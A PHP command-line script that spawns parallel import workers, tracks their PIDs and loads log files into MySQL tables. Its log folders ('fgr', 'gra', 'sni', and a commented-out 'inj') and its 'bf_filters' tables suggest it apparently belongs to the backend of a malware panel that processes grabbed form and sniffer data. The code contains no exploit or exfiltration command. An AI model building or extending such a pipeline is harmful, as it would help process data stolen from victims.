#!/usr/bin/env php
<?php

define('MAX_PROCESS', 25);
define('WIN_LOCALIZE_PID', 'PID');
define('PHP_EXE', 'c:\WebServers\usr\local\php5\php-win.exe');
define('IDOS', strtoupper(substr(PHP_OS, 0, 3)));

set_time_limit(0);
//ignore_user_abort(true);
error_reporting(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '128M');

function real_path($p){
	$r =  str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
	if(empty($r)){
		mkdir(str_replace('//', '/', str_replace('\\', '/', $p)));
		$r =  str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
	}
	return $r;
}

$dir = array();
$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
$dir['site'] = real_path($dir['script'] . '/../../');
$dir['logs'] = real_path($dir['site'] . 'logs/');
$dir['pids'] = real_path($dir['site'] . 'cache/imports/pids/');
$dir['proc'] = real_path($dir['site'] . 'cache/imports/proc/');
$dir['l']['5'] = real_path($dir['logs'] . 'export/fgr/');
$dir['l']['6'] = real_path($dir['logs'] . 'export/gra/');
$dir['l']['7'] = real_path($dir['logs'] . 'export/sni/');
$dir['u']['5'] = real_path($dir['logs'] . 'save_sort/fgr/');
$dir['u']['6'] = real_path($dir['logs'] . 'save_sort/gra/');
$dir['s']['5'] = real_path($dir['logs'] . 'save_logs/fgr/');
$dir['s']['6'] = real_path($dir['logs'] . 'save_logs/gra/');
file_put_contents($dir['site'] . 'cache/imports/dirs.json', json_encode($dir));

ini_set('error_log', $dir['site'] . 'cache/imports/import_errors_php.txt');

function error_import_handler($code, $msg, $file, $line){
	global $dir;
	if($code != 8) file_put_contents($dir['site'] . 'cache/imports/import_errors_php.txt', print_r(array('code' => $code, 'msg' => $msg, 'file' => $file, 'line' => $line), true) . "\r\n", FILE_APPEND);
}
set_error_handler('error_import_handler');

$pid_file = 'cache/imports/import.pid';

if(file_exists($dir['site'] . $pid_file)){
	if(IDOS === 'WIN'){
		$pid = file_get_contents($dir['site'] . $pid_file);
		if(stripos(exec('tasklist /FI "'.WIN_LOCALIZE_PID.' eq '.$pid.'"'), $pid) === false){
			file_put_contents($dir['site'] . $pid_file, getmypid());
		}else{
			exit;
		}
	}else{
		$pid = file_get_contents($dir['site'] . $pid_file);
		if(stripos(exec('ps -p '.$pid), $pid) === false){
			file_put_contents($dir['site'] . $pid_file, getmypid());
		}else{
			exit;
		}
	}
}else{
	file_put_contents($dir['site'] . $pid_file, getmypid());
}

function start_win($id, $unnecessary = 0){
	global $dir;
	if($unnecessary != 0){
		file_put_contents($dir['pids'] . $id . '-1', 'id');
	}else{
		file_put_contents($dir['pids'] . $id . '-0', 'id');
	}
	$WshShell = new COM("WScript.Shell");
	$oExec = $WshShell->Run(addslashes(PHP_EXE . ' ' . $dir['script'] . '/import_file.php ' . $id . ' ' . $unnecessary), 7, false);
	unset($WshShell,$oExec);
}

function start_lin($id, $unnecessary = 0){
	global $dir;
	if($unnecessary != 0){
		file_put_contents($dir['pids'] . $id . '-1', 'id');
	}else{
		file_put_contents($dir['pids'] . $id . '-0', 'id');
	}
	exec($dir['script'] . '/import_file.php ' . $id . ' ' . $unnecessary . ' > /dev/null &');
}

function load_task($row){
	global $task;
	$row->unnecessary = 0;
	$task[] = $row;
}

function load_unnecessary($row){
	global $task;
	$row->unnecessary = 1;
	$task[] = $row;
}

function df(){
	global $dir;
	$delete = @glob($dir['pids'] . '*', GLOB_BRACE);
	foreach($delete as $v){
		if(is_dir($v)){
			rmdir($v);
		}elseif(is_file($v)){
			unlink($v);
		}
	}
}

df();

include_once($dir['site'] . 'includes/functions.get_config.php');
include_once($dir['site'] . 'includes/functions.get_files.php');
include_once($dir['site'] . 'includes/functions.create_filter.php');
include_once($dir['site'] . 'includes/functions.load_filters.php');

$cfg_db = get_config();

require_once($dir['site'] . 'classes/mysqli.class.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0){
	error_log('DB_ERROR: ' . print_r($mysqli->errors, true),4);
	exit;
}

//get_files($dir['logs'] . 'import/fgr/', 1, date('d.m.Y') . '.txt');
//get_files($dir['logs'] . 'import/gra/', 2, date('d.m.Y') . '.txt');
//get_files($dir['logs'] . 'import/sni/', 3, date('d.m.Y') . '.txt');
//get_files($dir['logs'] . 'import/tra/', 4, date('d.m.Y') . '.txt');
get_files($dir['l']['5'], 5, date('d.m.Y_G') . '.txt');
get_files($dir['l']['6'], 6, date('d.m.Y_G') . '.txt');
get_files($dir['l']['7'], 7, date('d.m.Y_G') . '.txt');
//get_files($dir['logs'] . 'export/inj/', 8, date('d.m.Y_G') . '.txt');

$task = array();
$flist = array();
$filters = array();
$child = array();
$cur_proc = 0;

$mysqli->query('SHOW TABLE STATUS', null, 'load_flist');
$mysqli->query('SELECT id, fields, host, save_log FROM bf_filters WHERE host IS NOT NULL', null, 'load_filters');
$mysqli->query('SELECT id FROM bf_filters_files WHERE (type = \'6\') AND (import = \'0\')', null, 'load_task');
//$mysqli->query('SELECT b.* FROM bf_filters a, bf_filters_unnecessary b WHERE (a.host LIKE CONCAT(b.host,\'%\'))', null, 'load_unnecessary');
//$mysqli->query('SELECT b.* FROM bf_filters a, bf_filters_unnecessary b WHERE NOT isNULL(a.host) AND (a.host NOT LIKE \'%,%\') AND (b.host = a.host)', null, 'load_unnecessary');
/*
$ufs = $mysqli->query('SELECT host FROM bf_filters WHERE NOT isNULL(host) AND (host LIKE \'%,%\')', null, null, false);
if(count($ufs) > 0){
	foreach($ufs as $u){
		$x = '';
		$y = explode(',', $u->host);
		if(count($y) > 0){
			foreach($y as $s){
				$x .= '(host = \''.$s.'\') OR ';
			}
			$mysqli->query('SELECT * FROM bf_filters_unnecessary WHERE ' . preg_replace('~ OR $~', '', $x), null, 'load_unnecessary');
		}
	}
}
*/
load_filters(array('id' => 'ep', 'fields' => '', 'host' => 'ep_gra', 'save_log' => '0'));
load_filters(array('id' => 'ft', 'fields' => '', 'host' => 'ft_gra', 'save_log' => '0'));
load_filters(array('id' => 'me', 'fields' => '', 'host' => 'me_gra', 'save_log' => '0'));
load_filters(array('id' => 'rd', 'fields' => '', 'host' => 'rd_gra', 'save_log' => '0'));

unset($filters['ep_gra'], $filters['ft_gra'], $filters['me_gra'], $filters['rd_gra']);

$count_all = count($task);
$time = time();
$count = array('all' => 0, 'last_time' => 0, 'last_cur' => 0, 'last_rests' => 0, 'time' => 0, 'cur' => 0, 'rests' => 0, 'count' => 0);

file_put_contents($dir['site'] . 'cache/imports/filters.json', json_encode($filters));
file_put_contents($dir['site'] . 'cache/imports/data.json', json_encode($count));

do{
	if(count($child) < MAX_PROCESS){
		if(count($task) > 0){
			sort($task);
			if(count($task) > 0){
				for($i = 0; $i < (MAX_PROCESS-count($child)); $i++){
					if(!empty($task[$i])){
						$child[] = true;

						if(IDOS === 'WIN'){
							start_win($task[$i]->id, $task[$i]->unnecessary);
						}else{
							start_lin($task[$i]->id, $task[$i]->unnecessary);
						}

						unset($task[$i]);
						sort($task);
					}
				}
			}
			unset($i);
			usleep(500);
		}
	}else{
		sleep(5);
	}

	if(@($time+10) < time()){
		$cur_proc = scandir($dir['pids'], false);
		unset($cur_proc[0], $cur_proc[1]);
		if(count($cur_proc) > 0){
			$child = $cur_proc;
			foreach($cur_proc as $key => $pid){
				if(file_exists($dir['pids'] . $pid)){
					$type = file_get_contents($dir['pids'] . $pid);
					if($type == 'socket'){
                   		$socket = @stream_socket_server('tcp://127.0.0.1:' . $pid, $errno, $errstr);
                   		if($socket != false){
                   			array_pop($child);
                   			if(file_exists($dir['pids'] . $pid)) @unlink($dir['pids'] . $pid);
                           	fclose($socket);
                   		}
					}elseif($type == 'pid'){
						if(IDOS === 'WIN'){
							$check_pid = exec('tasklist /FI "'.WIN_LOCALIZE_PID.' eq '.$pid.'" /NH');
						}else{
							$check_pid = exec('ps -p '.$pid.'');
						}

						if(stripos($check_pid, $pid) === false){
							array_pop($child);
							if(file_exists($dir['pids'] . $pid)) @unlink($dir['pids'] . $pid);
						}
					}
				}
			}
			unset($cur_proc);
		}else{
			unset($child);
			$child = array();
		}

		if($time - $count['time'] >= 10){
			$count = json_decode(@file_get_contents($dir['site'] . 'cache/imports/data.json'), true);
			$count['all'] = $count_all;
			if(time() - $count['last_time'] >= 60){
				$count['last_time'] = $count['time'];
				$count['last_cur'] = $count['cur'];
				$count['last_rests'] = $count['rests'];
			}
			$count['cur'] = count($child);
			$count['rests'] = count($task);
			$count['time'] = time();
			file_put_contents($dir['site'] . 'cache/imports/data.json', json_encode($count));
		}
		$time = time();
	}
	usleep(1000);
}while(count($task) > 0 || count($child) > 0);

if(file_exists($dir['site'] . 'cache/imports/data.json')) @unlink($dir['site'] . 'cache/imports/data.json');
if(file_exists($dir['site'] . $pid_file)) unlink($dir['site'] . $pid_file);

?>